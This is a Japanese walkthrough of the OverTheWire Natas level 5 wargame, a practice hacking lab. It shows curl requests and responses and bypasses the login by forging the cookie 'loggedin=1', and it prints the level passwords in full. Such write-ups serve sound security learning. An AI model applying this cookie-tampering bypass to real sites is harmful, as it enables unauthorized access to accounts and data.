# NATAS5

- Username: natas5
- Password: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
- URL: http://natas5.natas.labs.overthewire.org

```
$ curl -v -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org
```
```html
*   Trying 176.9.9.172:80...
* TCP_NODELAY set
* Connected to natas5.natas.labs.overthewire.org (176.9.9.172) port 80 (#0)
* Server auth using Basic with user 'natas5'
> GET / HTTP/1.1
> Host: natas5.natas.labs.overthewire.org
> Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 09 Jan 2021 10:57:27 GMT
< Server: Apache/2.4.10 (Debian)
< Set-Cookie: loggedin=0
< Vary: Accept-Encoding
< Content-Length: 855
< Content-Type: text/html; charset=UTF-8
<
```
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
* Connection #0 to host natas5.natas.labs.overthewire.org left intact
```
ヒントに
```
< Set-Cookie: loggedin=0
```
```
Access disallowed. You are not logged in</div>
```
と書いてあります。  
そこでクッキーを送信して`loggedin`の値を変更します。
```
$ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq \
       -b loggedin=1 \
          http://natas5.natas.labs.overthewire.org
```
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
</body>
</html>
```
これでpassword(`aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`)を得ることができました。
